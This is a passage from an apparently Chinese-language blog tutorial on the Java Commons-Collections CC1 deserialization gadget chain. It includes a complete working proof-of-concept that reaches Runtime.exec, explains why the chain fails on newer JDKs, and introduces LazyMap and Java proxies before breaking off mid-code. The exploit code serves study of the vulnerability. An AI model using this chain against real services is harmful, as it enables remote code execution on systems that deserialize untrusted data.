class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[] &#123; String.class, Class[].class &#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[] &#123; <span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[<span class="hljs-number">0</span>] &#125;),<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[] &#123; Object.class, Object[].class &#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[] &#123; <span class="hljs-literal">null</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[<span class="hljs-number">0</span>] &#125;),<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[] &#123; String.class &#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[] &#123;<span class="hljs-string">&quot;/System/Applications/Calculator.app/Contents/MacOS/Calculator&quot;</span> &#125;),<br>        &#125;;<br></code></pre></td></tr></table></figure><blockquote><p>解释一下这一段代码，Transformer就可以理解为回调函数，在<code>new ConstantTransformer(Runtime.class)</code>以后返回Runtime，传给下一个参数，接着再调用Runtime的getMethod方法，在调用getname方法，依次类推，最后成功弹出计算器</p></blockquote><p>demo是这样的</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java">Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.getRuntime()),<br> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]<br>&#123;<span class="hljs-string">&quot;/System/Applications/Calculator.app/Contents/MacOS/Calculator&quot;</span>&#125;),&#125;;<br></code></pre></td></tr></table></figure><p>再列一下InvokerTransformer</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-title function_">InvokerTransformer</span><span class="hljs-params">(String methodName, Class[] paramTypes, Object[]</span><br><span class="hljs-params">args)</span> &#123;<br> <span class="hljs-built_in">super</span>();<br> iMethodName = methodName;<span class="hljs-comment">//方法名</span><br> iParamTypes = paramTypes;<span class="hljs-comment">//参数类型</span><br> iArgs = args;<span class="hljs-comment">//参数列表</span><br>&#125;<br></code></pre></td></tr></table></figure><p>先解释一下为什么new Class[0]和new Object[0]都是0，而不可以用其他的数字，例如1</p><blockquote><p>0是因为表示数组长度为零，用来表示方法或者函数是没有参数的</p><p>如果你使用new Class[1]和new Object[1]，将会是数组长度为1，第一个元素为null，但是在这个例子中，方法或函数是没有参数的，所以使用长度为0的数组更合适。</p><p>如果你传入长度为1的数组，那么在方法调用的时候，会传入一个参数，这个参数是null，但是这个方法本身就没有参数，那么这个方法的调用将会失败。</p></blockquote><p>还有就是既然没有参数，为什么还要使用数组</p><blockquote><p>Java的反射机制要求调用方法或函数的参数必须是一个数组类型。如果你传入的不是数组类型，调用会抛出IllegalArgumentException。</p><p>上面的demo中, new Class[0] 和 new Object[0] 都是长度为0的数组，它们的目的是告诉反射系统要调用的方法或函数没有参数。</p></blockquote><p>其实和demo最大的区别就是将 Runtime.getRuntime() 换成了 Runtime.class ，前者是一个java.lang.Runtime 对象，后者是一个 java.lang.Class 对象。Class类有实现Serializable接口，所以可以被序列化。</p><h3 id="仍无法弹出计算器"><a href="#仍无法弹出计算器" class="headerlink" title="仍无法弹出计算器"></a>仍无法弹出计算器</h3><p><img src="https://cdn.jsdelivr.net/gh/Decemberus/image/202303191224949.png" alt="image-20230111165817497"> </p><p>这次输出了序列化以后的数据流，但是却没有弹出计算器</p><p>这个实际上和<code>AnnotationInvocationHandler</code>类的逻辑有关，我们可以动态调试就会发现，在<code>AnnotationInvocationHandler:readObject</code> 的逻辑中，有一个if语句对var7进行判断，只有在其不是null的时候才会进入里面执行setValue，否则不会进入也就不会触发漏洞</p><p><img src="https://cdn.jsdelivr.net/gh/Decemberus/image/202303191224750.png" alt="image-20230111171700832"> </p><p>那么如何让这个var7不为null呢？这直接给出两个条件：</p><ol><li><p><code>sun.reflect.annotation.AnnotationInvocationHandler</code> 构造函数的第一个参数必须是Annotation的子类，且其中必须含有至少一个方法，假设方法名是X</p></li><li><p>被 <code>TransformedMap.decorate</code> 修饰的Map中必须有一个键名为X的元素</p></li></ol><p>所以，这也解释了为什么我前面用到 Retention.class ，因为Retention有一个方法，名为value；所以，为了再满足第二个条件，我需要给Map中放入一个Key是value的元素：</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">innerMap.<span class="hljs-keyword">put</span>(<span class="hljs-string">&quot;value&quot;</span>, <span class="hljs-string">&quot;xxxx&quot;</span>);<br></code></pre></td></tr></table></figure><h3 id="Java-高版本不能利用的原因"><a href="#Java-高版本不能利用的原因" class="headerlink" title="Java 高版本不能利用的原因"></a>Java 高版本不能利用的原因</h3><p>因为Java官方修改了<code>sun.reflect.annotation.AnnotationInvocationHandler</code>的<code>readObject</code></p><p>对于这次修改，有些文章说是因为没有了setValue，其实原因和setValue关系不大。改动后，不再直接使用反序列化得到的Map对象，而是新建了一个LinkedHashMap对象，并将原来的键值添加进去。</p><p>所以，后续对Map的操作都是基于这个新的LinkedHashMap对象，而原来我们精心构造的Map不再执行set或put操作，也就不会触发RCE了。</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>我们这一章将上一章给出的demo扩展成为了一个真实可利用的POC，完整代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> ysoserial.payloads;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.TransformedMap;<br><br><span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.annotation.Retention;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CommonsCollections1_p</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[] &#123;<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[] &#123; String.class, Class[].class &#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[] &#123; <span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[<span class="hljs-number">0</span>] &#125;),<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[] &#123; Object.class, Object[].class &#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[] &#123; <span class="hljs-literal">null</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[<span class="hljs-number">0</span>] &#125;),<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[] &#123; String.class &#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[] &#123;<span class="hljs-string">&quot;C:/Windows/System32/calc.exe&quot;</span> &#125;),<br>        &#125;;<br>        <span class="hljs-type">Transformer</span> <span class="hljs-variable">transformerChain</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">innerMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        innerMap.put(<span class="hljs-string">&quot;test&quot;</span>, <span class="hljs-string">&quot;xxxx&quot;</span>);<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">outerMap</span> <span class="hljs-operator">=</span> TransformedMap.decorate(innerMap, <span class="hljs-literal">null</span>, transformerChain);<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        <span class="hljs-type">Constructor</span> <span class="hljs-variable">construct</span> <span class="hljs-operator">=</span> clazz.getDeclaredConstructor(Class.class, Map.class);<span class="hljs-comment">//通过构造器创建带参数的class对象对象</span><br>        construct.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> construct.newInstance(Retention.class, outerMap);<br><br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">barr</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(barr);<br>        oos.writeObject(obj);<br>        oos.close();<br><br>        System.out.println(barr);<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">objectInputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(barr.toByteArray()));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> objectInputStream.readObject();<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[] &#123; String.class, Class[].class &#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[] &#123; <span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[<span class="hljs-number">0</span>] &#125;)<br></code></pre></td></tr></table></figure><p>拿这段代码距离说明getMethod后面那一堆参数的作用</p><p>第一个参数是字符串 <code>&quot;getMethod&quot;</code>，表示要调用目标对象的 <code>getMethod</code> 方法。</p><p>第二个参数是一个 <code>Class</code> 对象数组，它表示 <code>getMethod</code> 方法的参数类型。这里的 <code>Class[]</code> 表示一个 <code>Class</code> 类型的数组。数组中的第一个元素是 <code>String.class</code>，表示要查找的方法名为字符串类型。数组中的第二个元素是 <code>Class[].class</code>，表示要查找的方法的参数类型为 <code>Class</code> 类型的数组。</p><p>第三个参数是一个 <code>Object</code> 对象数组，它表示 <code>getMethod</code> 方法的参数值。这里数组第二个参数new Class[0]是<code>getRuntime</code>的参数，因为是Class[0]，表示<code>getRuntime</code>没有任何参数</p><p>由于 <code>getMethod</code> 方法是通过反射来查找目标方法的，因此需要指定要查找的方法名和参数类型。如果方法没有任何参数，那么就需要传入一个空的 <code>Class</code> 数组。</p></blockquote><p>但是这个payload存在局限性，必须再8u71以前的版本使用</p><h2 id="yso官方的CC1"><a href="#yso官方的CC1" class="headerlink" title="yso官方的CC1"></a>yso官方的CC1</h2><p>在ysoserial中，他使用的是一个lazyMap，而没有使用TransformedMap</p><figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dart"><span class="hljs-keyword">final</span> <span class="hljs-built_in">Map</span> lazyMap = LazyMap.decorate(innerMap, transformerChain);<br></code></pre></td></tr></table></figure><p>这个官方的写法其实并不是为了解决高版本无法利用的问题，主要的问题其实在<code>sun.reflect.annotation.AnnotationInvocationHandler</code>类上</p><h3 id="LazyMap"><a href="#LazyMap" class="headerlink" title="LazyMap"></a>LazyMap</h3><p>LazyMap和TransformedMap类似，都来自于Common-Collections库，并继承AbstractMapDecorator。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">LazyMap</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractMapDecorator</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Map</span>, Serializable &#123;<br></code></pre></td></tr></table></figure><p>LazyMap的漏洞触发点和TransformedMap唯一的差别是，TransformedMap是在写入元素的时候执行transform，而LazyMap是在其get方法中执行的 factory.transform 。其实这也好理解，LazyMap的作用是“懒加载”，在get找不到值的时候，它会调用 factory.transform 方法去获取一个值：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> Object <span class="hljs-title function_">get</span><span class="hljs-params">(Object key)</span> &#123;<br><span class="hljs-comment">// create value for key if key is not currently in the map</span><br><span class="hljs-keyword">if</span> (map.containsKey(key) == <span class="hljs-literal">false</span>) &#123;<br><span class="hljs-type">Object</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> factory.transform(key);<br>map.put(key, value);<br><span class="hljs-keyword">return</span> value;<br>&#125;<br><span class="hljs-keyword">return</span> map.get(key);<br>&#125;<br></code></pre></td></tr></table></figure><p>但是相比于TransformedMap的利用方法，LazyMap后续利用稍微复杂一些，原因是在<code>sun.reflect.annotation.AnnotationInvocationHandler</code> 的readObject方法中并没有直接调用到Map的get方法。</p><p>所以ysoserial找到了另一条路，<code>AnnotationInvocationHandler</code>类的invoke方法有调用到get：</p><p><img src="https://cdn.jsdelivr.net/gh/Decemberus/image/202303191224742.png" alt="image-20230129144014934"> </p><p>那么又如何能调用到 <code>AnnotationInvocationHandler#invoke</code> 呢？ysoserial的作者想到的是利用Java的对象代理</p><h3 id="Java对象代理"><a href="#Java对象代理" class="headerlink" title="Java对象代理"></a>Java对象代理</h3><p>代理模式是一种设计模式，提供了对目标对象额外的访问方式，即通过代理对象访问目标对象，这样可以在不修改原目标对象的前提下，提供额外的功能操作，扩展目标对象的功能。</p><p>简言之，代理模式就是设置一个中间代理来控制访问原目标对象，以达到增强原对象的功能和简化访问方式。</p><blockquote><p>代理模式UML类图</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/Decemberus/image/202303191224203.png" alt="代理模式UML类图"> </p><p>举个例子，我们生活中经常到火车站去买车票，但是人一多的话，就会非常拥挤，于是就有了代售点，我们能从代售点买车票了。这其中就是代理模式的体现，代售点代理了火车站对象，提供购买车票的方法。</p><h4 id="静态代理"><a href="#静态代理" class="headerlink" title="静态代理"></a>静态代理</h4><p>这种代理方式需要代理对象和目标对象实现一样的接口。</p><p>优点：可以在不修改目标对象的前提下扩展目标对象的功能。</p><p>缺点：</p><ol><li>冗余。由于代理对象要实现与目标对象一致的接口，会产生过多的代理类。</li><li>不易维护。一旦接口增加方法，目标对象与代理对象都要进行修改。</li></ol><blockquote><p>举例：保存用户功能的静态代理实现</p></blockquote><ul><li>接口类： IUserDao</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.proxy;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">IUserDao</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">save</span><span class="hljs-params">()</span>;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>目标对象：UserDao</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.proxy;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserDao</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">IUserDao</span>&#123;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">save</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;保存数据&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>静态代理对象：UserDaoProxy 需要实现IUserDao接口！</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.proxy;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserDaoProxy</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">IUserDao</span>&#123;<br><br>    <span class="hljs-keyword">private</span> IUserDao target;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">UserDaoProxy</span><span class="hljs-params">(IUserDao target)</span> &#123;<br>        <span class="hljs-built_in">this</span>.target = target;<br>    &#125;<br>    <br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">save</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;开启事务&quot;</span>);<span class="hljs-comment">//扩展了额外功能</span><br>        target.save();<br>        System.out.println(<span class="hljs-string">&quot;提交事务&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>测试类：TestProxy</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.proxy;<br><br><span class="hljs-keyword">import</span> org.junit.Test;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">StaticUserProxy</span> &#123;<br>    <span class="hljs-meta">@Test</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">testStaticProxy</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-comment">//目标对象</span><br>        <span class="hljs-type">IUserDao</span> <span class="hljs-variable">target</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UserDao</span>();<br>        <span class="hljs-comment">//代理对象</span><br>        <span class="hljs-type">UserDaoProxy</span> <span class="hljs-variable">proxy</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UserDaoProxy</span>(target);<br>        proxy.save();<br>    &#125;<br>&#125;<br><span class="hljs-comment">//简单来说就是新建一个目标对象，把目标对象作为参数丢进代理对象中</span><br></code></pre></td></tr></table></figure><ul><li>输出结果</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">开启事务<br>保存数据<br>提交事务<br></code></pre></td></tr></table></figure><h4 id="动态代理"><a href="#动态代理" class="headerlink" title="动态代理"></a>动态代理</h4><p>动态代理利用了<a href="https://link.segmentfault.com/?enc=0DvEOM6+WbPHykSMZ3c9tw==.EnFrCzt+OrTJn/GXSH2XJyN/gyfaZapKyYfhWUdEU0a1yL5nQZ2PVg45dTaZ4k3b">JDK API</a>，动态地在内存中构建代理对象，从而实现对目标对象的代理功能。动态代理又被称为JDK代理或接口代理。</p><p>静态代理与动态代理的区别主要在：</p><ul><li>静态代理在编译时就已经实现，编译完成后代理类是一个实际的class文件</li><li>动态代理是在运行时动态生成的，即编译完成后没有实际的class文件，而是在运行时动态生成类字节码，并加载到JVM中</li></ul><p><strong>特点：</strong><br>动态代理对象不需要实现接口，但是要求目标对象必须实现接口，否则不能使用动态代理。</p><p>JDK中生成代理对象主要涉及的类有</p><ul><li><a href="https://link.segmentfault.com/?enc=y1H+t4YvPYIgKTKhETotyQ==.pbWU0z2U5LjTUKeB9I19XxYYeP1MtOIjsWu7gFSphM1exXUnhbEOfkA45krUPF4Ge5FZHGqsjJyv18pXSO9y+hd+j4DqxdI1MhDaQGORfy0=">java.lang.reflect Proxy</a>，主要方法为</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">static</span> Object    <span class="hljs-title function_">newProxyInstance</span><span class="hljs-params">(ClassLoader loader,  //指定当前目标对象使用类加载器</span><br><span class="hljs-params"></span><br><span class="hljs-params"> Class&lt;?&gt;[] interfaces,    //目标对象实现的接口的类型</span><br><span class="hljs-params"> InvocationHandler h      //事件处理器</span><br><span class="hljs-params">)</span> <br><span class="hljs-comment">//返回一个指定接口的代理类实例，该接口可以将方法调用指派到指定的调用处理程序。</span><br></code></pre></td></tr></table></figure><ul><li><a href="https://link.segmentfault.com/?enc=rLH60PciGYcYxqIkPdyeEg==.WpgwFGLNpJiqL9CTqZ9cuePBmZDI+jqGbnHwT6B3vVQc3TDic16OuMfQkRkvUMpYf/tNZiM10MlDNIlwdaugRhHxjbKdV8XwpHZcw12XqZzR43kCwb7fqlZJHQDbc3Xd">java.lang.reflect InvocationHandler</a>，主要方法为</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"> Object    <span class="hljs-title function_">invoke</span><span class="hljs-params">(Object proxy, Method method, Object[] args)</span> <br><span class="hljs-comment">// 在代理实例上处理方法调用并返回结果。</span><br></code></pre></td></tr></table></figure><blockquote><p>举例：保存用户功能的动态代理实现</p></blockquote><ul><li>接口类： IUserDao</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.proxy;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">IUserDao</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">save</span><span class="hljs-params">()</span>;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>目标对象：UserDao</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.proxy;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserDao</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">IUserDao</span>&#123;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">save</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;保存数据&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>动态代理对象：UserProxyFactory</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.proxy;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationHandler;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><span class="hljs-keyword">import</span> java.lang.reflect.Proxy;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ProxyFactory</span> &#123;<br><br>    <span class="hljs-keyword">private</span> Object target;<span class="hljs-comment">// 维护一个目标对象</span><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">ProxyFactory</span><span class="hljs-params">(Object target)</span> &#123;<br>        <span class="hljs-built_in">this</span>.target = target;<br>    &#125;<br><br>    <span class="hljs-comment">// 为目标对象生成代理对象</span><br>    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">getProxyInstance</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> Proxy.newProxyInstance(target.getClass().getClassLoader(), target.getClass().getInterfaces(),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvocationHandler</span>() &#123;<br><br>                    <span class="hljs-meta">@Override</span><span class="hljs-comment">//这后面用于定义代理对象的行为，在目标对象的方法被调用时执行</span><br>                    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">invoke</span><span class="hljs-params">(Object proxy, Method method, Object[] args)</span> <span class="hljs-keyword">throws</span> Throwable &#123;<br>                        System.out.println(<span class="hljs-string">&quot;开启事务&quot;</span>);<br><br>                        <span class="hljs-comment">// 执行目标对象方法</span><br>                        <span class="hljs-type">Object</span> <span class="hljs-variable">returnValue</span> <span class="hljs-operator">=</span> method.invoke(target, args);<br><br>                        System.out.println(<span 